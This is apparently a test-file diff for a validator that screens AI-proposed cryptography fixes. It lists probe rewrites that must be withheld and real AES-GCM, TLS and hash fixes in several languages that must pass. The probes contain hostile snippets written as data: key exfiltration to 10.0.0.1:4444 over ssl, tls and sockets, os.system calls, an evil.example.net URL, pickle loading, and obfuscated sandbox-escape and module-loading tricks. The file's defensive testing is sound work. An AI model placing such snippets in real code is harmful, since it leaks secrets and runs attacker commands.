@@ -402,3 +402,175 @@ def test_review_the_window_is_redacted_before_bedrock_and_restored(api, world, b
     assert len(bedrock["sent"]) == 1
     assert out["status"] == "ok", out.get("withheld_reason")
     assert out["fix"]["fixed_code"] == fixed.rstrip("\n") and "kms.internal.example.com" in out["fix"]["diff"]
+
+
+# ------------------------------------------------------------------------------------------------ re-review of PR 249
+# Every probe of the two security reviews (rev249 probe_fix.py .. probe_fix4.py), with the outcome it must have.
+# The API check is an allow-list: a call / member the window did not already use must configure cryptography.
+_HEAD = "import os\nfrom Crypto.Cipher import AES\n"
+_R = "\n    return AES.new(key, AES.MODE_GCM, nonce=os.urandom(12)).encrypt(data)"
+_SSL = "import os\nimport ssl\nfrom Crypto.Cipher import AES\n\ndef encrypt(data, key):\n"
+_JH = "const crypto = require('crypto');\nfunction enc(d, k) {\n"
+_JT = "\n  const c = crypto.createCipheriv('aes-256-gcm', k, crypto.randomBytes(12));\n  return c.update(d);\n}"
+_GO = 'import (\n\t"crypto/aes"\n\t"crypto/tls"\n)\n\nfunc enc(k []byte) {\n\tb, _ := aes.NewCipher(k)\n\t_ = b\n}'
+_JV = ("import javax.crypto.Cipher;\nimport javax.net.ssl.SSLSocketFactory;\n\nclass A {\n  byte[] enc(byte[] k) throws Exception "
+       "{\n    Cipher c = Cipher.getInstance(\"AES/ECB/PKCS5Padding\");\n    return null;\n  }\n}")
+_FAR = ECB.rstrip("\n").split("\n") + [""] * 10
+PROBES = [  # (name, language, window, reported line, rewrite, expected status)
+    # probe_fix.py
+    ("control GCM", "python", ECB, 5, _body("    nonce = os.urandom(12)\n    return AES.new(key, AES.MODE_GCM, nonce=nonce)"
+                                            ".encrypt(data)"), "ok"),
+    ("import builtins", "python", ECB, 5, _body("    import builtins\n" + _GCM), "withheld"),
+    ("key = literal", "python", ECB, 5, _body("    key = 'QUJDREVGR0hJSktMTU5PUA=='\n" + _GCM), "withheld"),
+    ("key via concat", "python", ECB, 5, _body("    key = 'QUJDREVGR0hJ' + 'SktMTU5PUA=='\n" + _GCM), "withheld"),
+    ("url concat", "python", ECB, 5, _body("    u = 'https:' + '//evil' + '.example' + '.net/x'\n" + _GCM), "withheld"),
+    ("url", "python", ECB, 5, _body("    u = 'https://evil.example.net/x'\n" + _GCM), "withheld"),
+    ("cyrillic name", "python", ECB, 5, _body("    еxec = 1\n" + _GCM), "withheld"),
+    ("import subprocess", "python", ECB, 5, _body("    import subprocess\n" + _GCM), "withheld"),
+    ("far os.system", "python", ECB, 5, "\n".join(_FAR + ["os.system('x')"]), "withheld"),
+    # probe_fix2.py
+    ("url 2 pieces", "python", ECB, 5, _body("    u = 'https://ev' + 'il.net/x'\n" + _GCM), "withheld"),
+    ("ip literal tuple (no call)", "python", ECB, 5, _body("    t = ('10.0.0.1', 4444)\n" + _GCM), "ok"),
+    # probe_fix3.py, Python
+    ("GOOD gcm", "python", ECB, 5, _body("    nonce = os.urandom(12)" + _R), "ok"),
+    ("GOOD env key", "python", ECB, 5, _body("    key = os.environ['APP_KEY'].encode()" + _R), "ok"),
+    ("GOOD pass", "python", ECB, 5, _body("    pass" + _R), "ok"),
+    ("import os as o; o.system", "python", ECB, 5, "import os\nimport os as o\nfrom Crypto.Cipher import AES\n\n"
+     "def encrypt(data, key):\n    o.system('id')" + _R + "\n", "withheld"),
+    ("mro gadget", "python", ECB, 5, _body("    ().__class__.__mro__[1].__subclasses__()" + _R), "withheld"),
+    ("type() 3-arg", "python", ECB, 5, _body("    T = type('T', (object,), {'x': 1})" + _R), "withheld"),
+    ("breakpoint()", "python", ECB, 5, _body("    breakpoint()" + _R), "withheld"),
+    ("import pickle", "python", ECB, 5, _body("    import pickle; pickle.loads(data)" + _R), "withheld"),
+    ("import marshal", "python", ECB, 5, _body("    import marshal" + _R), "withheld"),
+    ("import_module", "python", ECB, 5, _body("    __import__('importlib').import_module('sock' + 'et')" + _R), "withheld"),
+    ("ssl.create_connection", "python", ECB, 5, _SSL + "    ssl.create_connection(('10.0.0.1', 4444)).sendall(key)"
+     + _R + "\n", "withheld"),
+    ("ssl.get_server_certificate", "python", ECB, 5, _SSL + "    ssl.get_server_certificate(('10.0.0.1', 4444))" + _R
+     + "\n", "withheld"),
+    ("ssl.socket", "python", ECB, 5, _SSL + "    ssl.socket.create_connection(('10.0.0.1', 4444))" + _R + "\n",
+     "withheld"),
+    ("from ssl import create_connection", "python", ECB, 5, "import os\nfrom ssl import create_connection\n"
+     "from Crypto.Cipher import AES\n\ndef encrypt(data, key):\n    create_connection(('10.0.0.1', 4444)).sendall(key)"
+     + _R + "\n", "withheld"),
+    ("ctx.wrap_socket", "python", ECB, 5, _SSL + "    ssl.create_default_context().wrap_socket(key)" + _R + "\n",
+     "withheld"),
+    ("os.path.os.system", "python", ECB, 5, _body("    os.path.os.system('id')" + _R), "withheld"),
+    ("str.format gadget", "python", ECB, 5, _body("    '{0.__globals__}'.format(encrypt)" + _R), "withheld"),
+    ("secrets.base64 hop", "python", ECB, 5, "import os\nimport secrets\nfrom Crypto.Cipher import AES\n\n"
+     "def encrypt(data, key):\n    secrets.base64.b64encode(key)" + _R + "\n", "withheld"),
+    ("print(key)", "python", ECB, 5, _body("    print(key.hex())" + _R), "withheld"),
+    # probe_fix3.py, JavaScript
+    ("GOOD js gcm", "javascript", JS, 3, _JH + "  const iv = crypto.randomBytes(12);" + _JT, "ok"),
+    ("GOOD js env key", "javascript", JS, 3, _JH + "  k = Buffer.from(process.env.APP_KEY, 'base64');" + _JT, "ok"),
+    ("require(`net`)", "javascript", JS, 3, _JH + "  require(`net`).connect(4444, '10.0.0.1');" + _JT, "withheld"),
+    ("require(`${}`)", "javascript", JS, 3, _JH + "  require(`${'n'}et`).connect(4444, '10.0.0.1');" + _JT, "withheld"),
+    ("process.binding", "javascript", JS, 3, _JH + "  process.binding('spawn_sync');" + _JT, "withheld"),
+    ("module.require", "javascript", JS, 3, _JH + "  module.require('child_process');" + _JT, "withheld"),
+    ("module['req'+'uire']", "javascript", JS, 3, _JH + "  module['req'+'uire']('n'+'et').connect(4444, '10.0.0.1');"
+     + _JT, "withheld"),
+    ("process['main'+'Module']", "javascript", JS, 3, _JH + "  process['main'+'Module'].require('n'+'et');" + _JT,
+     "withheld"),
+    ("process['mainModule'] literal", "javascript", JS, 3, _JH + "  const m = process['mainModule'];" + _JT, "withheld"),
+    ("tls.connect", "javascript", JS, 3, "const crypto = require('crypto');\nconst tls = require('tls');\n"
+     "function enc(d, k) {\n  tls.connect(4444, '10.0.0.1').write(k);" + _JT, "withheld"),
+    ("getPrototypeOf constructor", "javascript", JS, 3, _JH + "  Object.getPrototypeOf(enc)['constr'+'uctor']('return 1');"
+     + _JT, "withheld"),
+    ("computed key from a variable", "javascript", JS, 3, _JH + "  const f = crypto[k];" + _JT, "withheld"),
+    ("prototype", "javascript", JS, 3, _JH + "  const p = enc.prototype;" + _JT, "withheld"),
+    # probe_fix4.py
+    ("go tls.Dial", "go", _GO, 7, _GO.replace("\t_ = b\n", "\t_ = b\n\tc, _ := tls.Dial(\"tcp\", \"10.0.0.1:443\", nil)\n"
+                                                       "\tc.Write(k)\n"), "withheld"),
+    ("java createSocket", "java", _JV, 6, _JV.replace("    return null;", "    SSLSocketFactory.getDefault().createSocket("
+                                                      "\"10.0.0.1\", 443).getOutputStream().write(k);\n    return null;"),
+     "withheld"),
+]
+
+
+@pytest.mark.parametrize("name, lang, window, line, code, expected", PROBES, ids=[p[0] for p in PROBES])
+def test_review_every_probe_has_its_outcome(name, lang, window, line, code, expected):
+    finding = {**FINDING, "snippet": window, "language": lang, "line": line, "location": f"x:{line}"}
+    out = FIX.validate(_fix_answer(code), _grounding(finding), _window(finding))
+    assert out["status"] == expected, (name, out.get("withheld_reason"), out.get("checks"))
+    if expected == "withheld":
+        assert out["fix"] is None and out["baseline"] is True
+
+
+GOOD_FIXES = [  # (name, language, codes, window, reported line, rewrite): real fixes every language keeps
+    ("py tls verification", "python", ["TLS_VERIFICATION_DISABLED"],
+     "import requests\n\ndef get(url):\n    return requests.get(url, verify=False)\n", 4,
+     "import requests\n\ndef get(url):\n    return requests.get(url, verify=True, timeout=10)\n"),
+    ("py ssl context options", "python", ["TLS_VERIFICATION_DISABLED"],
+     "import ssl\n\ndef ctx():\n    c = ssl._create_unverified_context()\n    return c\n", 4,
+     "import ssl\n\ndef ctx():\n    c = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)\n"
+     "    c.minimum_version = ssl.TLSVersion.TLSv1_2\n    c.check_hostname = True\n    c.verify_mode = ssl.CERT_REQUIRED\n"
+     "    c.set_ciphers('ECDHE+AESGCM')\n    return c\n"),
+    ("py rsa key size", "python", ["WEAK_KEY_SIZE"],
+     "from cryptography.hazmat.primitives.asymmetric import rsa\n\ndef k():\n"
+     "    return rsa.generate_private_key(public_exponent=65537, key_size=1024)\n", 4,
+     "from cryptography.hazmat.primitives.asymmetric import rsa\n\ndef k():\n"
+     "    return rsa.generate_private_key(public_exponent=65537, key_size=3072)\n"),
+    ("py hashlib hmac secrets", "python", ["WEAK_ALGORITHM"],
+     "import hashlib\n\ndef h(d):\n    return hashlib.md5(d).hexdigest()\n", 4,
+     "import hashlib\nimport hmac\nimport secrets\n\ndef h(d):\n    return hashlib.sha256(d).hexdigest()\n\n"
+     "def same(a, b):\n    return hmac.compare_digest(a, b) and len(secrets.token_bytes(32)) == 32\n"),
+    ("py serialization enums", "python", ["WEAK_ALGORITHM"],
+     "from cryptography.hazmat.primitives import serialization\n\ndef pem(k):\n    return k.private_bytes("
+     "serialization.Encoding.PEM, serialization.PrivateFormat.TraditionalOpenSSL, serialization.NoEncryption())\n", 4,
+     "import os\nfrom cryptography.hazmat.primitives import serialization\n\ndef pem(k):\n    return k.private_bytes("
+     "serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8, "
+     "serialization.BestAvailableEncryption(os.environ['PEM_PASS'].encode()))\n"),
+    ("py class get_random_bytes", "python", ["WEAK_CIPHER_MODE"],
+     "import os\nfrom Crypto.Cipher import AES\n\nclass Box:\n    def enc(self, data):\n"
+     "        c = AES.new(self.key, AES.MODE_ECB)\n        return c.encrypt(data)\n", 6,
+     "import os\nfrom Crypto.Cipher import AES\nfrom Crypto.Random import get_random_bytes\n\nclass Box:\n"
+     "    def enc(self, data):\n        \"\"\"AES-GCM with a fresh nonce per message.\"\"\"\n"
+     "        c = AES.new(self.key, AES.MODE_GCM, nonce=get_random_bytes(12))\n        ct, tag = c.encrypt_and_digest(data)\n"
+     "        return c.nonce + tag + ct\n"),
+    ("js hash", "javascript", ["WEAK_ALGORITHM"],
+     "const crypto = require('crypto');\nfunction h(d) {\n  return crypto.createHash('md5').update(d).digest('hex');\n}\n", 3,
+     "const crypto = require('crypto');\nfunction h(d) {\n  return crypto.createHash('sha256').update(d).digest('hex');\n}\n"),
+    ("js gcm with tag", "javascript", ["WEAK_CIPHER_MODE"], JS, 3,
+     "const crypto = require('crypto');\nfunction enc(d, k) {\n  const iv = crypto.randomBytes(12);\n"
+     "  const c = crypto.createCipheriv('aes-256-gcm', k, iv);\n"
+     "  return Buffer.concat([iv, c.update(d), c.final(), c.getAuthTag()]);\n}\n"),
+    ("ts tls context", "typescript", ["WEAK_ALGORITHM"],
+     "const tls = require('tls');\nfunction ctx() {\n  return tls.createSecureContext({ minVersion: 'TLSv1' });\n}\n", 3,
+     "const tls = require('tls');\nfunction ctx() {\n  return tls.createSecureContext({ minVersion: 'TLSv1.2', "
+     "ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256' });\n}\n"),
+    ("java keygen and tls context", "java", ["WEAK_ALGORITHM"],
+     "import javax.crypto.KeyGenerator;\nimport javax.net.ssl.SSLContext;\nclass A {\n"
+     "  void a() throws Exception { KeyGenerator kg = KeyGenerator.getInstance(\"DES\"); }\n}\n", 4,
+     "import javax.crypto.KeyGenerator;\nimport javax.crypto.SecretKey;\nimport javax.net.ssl.SSLContext;\n"
+     "import java.security.SecureRandom;\nclass A {\n  void a() throws Exception { KeyGenerator kg = "
+     "KeyGenerator.getInstance(\"AES\"); kg.init(256); SecretKey k = kg.generateKey(); SSLContext ctx = "
+     "SSLContext.getInstance(\"TLSv1.3\"); ctx.init(null, null, new SecureRandom()); }\n}\n"),
+    ("java gcm iv", "java", ["WEAK_CIPHER_MODE"],
+     "import javax.crypto.Cipher;\nclass A {\n  Cipher c() throws Exception { return Cipher.getInstance("
+     "\"AES/ECB/PKCS5Padding\"); }\n}\n", 3,
+     "import javax.crypto.Cipher;\nimport java.security.SecureRandom;\nclass A {\n  byte[] iv() { byte[] n = new byte[12]; "
+     "new SecureRandom().nextBytes(n); return n; }\n  Cipher c() throws Exception { return Cipher.getInstance("
+     "\"AES/GCM/NoPadding\"); }\n}\n"),
+    ("go sha256 and tls config", "go", ["WEAK_ALGORITHM"],
+     "package a\n\nimport (\n\t\"crypto/md5\"\n\t\"crypto/tls\"\n)\n\nfunc h(d []byte) [16]byte { return md5.Sum(d) }\n", 8,
+     "package a\n\nimport (\n\t\"crypto/sha256\"\n\t\"crypto/tls\"\n)\n\nfunc h(d []byte) [32]byte "
+     "{ return sha256.Sum256(d) }\n\nvar cfg = &tls.Config{MinVersion: tls.VersionTLS12}\n"),
+    ("go aes gcm", "go", ["WEAK_CIPHER_MODE"],
+     "package a\n\nimport (\n\t\"crypto/des\"\n)\n\nfunc c(k []byte) { b, _ := des.NewCipher(k); _ = b }\n", 7,
+     "package a\n\nimport (\n\t\"crypto/aes\"\n\t\"crypto/cipher\"\n\t\"crypto/rand\"\n)\n\nfunc c(k []byte) "
+     "{ b, _ := aes.NewCipher(k); g, _ := cipher.NewGCM(b); n := make([]byte, g.NonceSize()); rand.Read(n) }\n"),
+    ("csharp aes-gcm", "csharp", ["WEAK_ALGORITHM"],
+     "using System.Security.Cryptography;\nclass A {\n  byte[] E(byte[] k, byte[] p) { var a = DES.Create(); "
+     "return null; }\n}\n", 3,
+     "using System.Security.Cryptography;\nclass A {\n  byte[] E(byte[] k, byte[] p) { using var a = new AesGcm(k, 16); "
+     "var n = new byte[12]; RandomNumberGenerator.Fill(n); var c = new byte[p.Length]; var t = new byte[16]; "
+     "a.Encrypt(n, p, c, t); return c; }\n}\n"),
+]
+
+
+@pytest.mark.parametrize("name, lang, codes, window, line, code", GOOD_FIXES, ids=[g[0] for g in GOOD_FIXES])
+def test_review_good_fixes_in_every_language_still_pass(name, lang, codes, window, line, code):
+    finding = {**FINDING, "snippet": window, "language": lang, "line": line, "location": f"x:{line}",
+               "finding_codes": codes}
+    out = FIX.validate(_fix_answer(code), _grounding(finding), _window(finding))
+    assert out["status"] == "ok", (name, out.get("withheld_reason"), out.get("checks"))
+    assert any(c["name"] == "only allow-listed APIs" and c["ok"] for c in out["checks"])
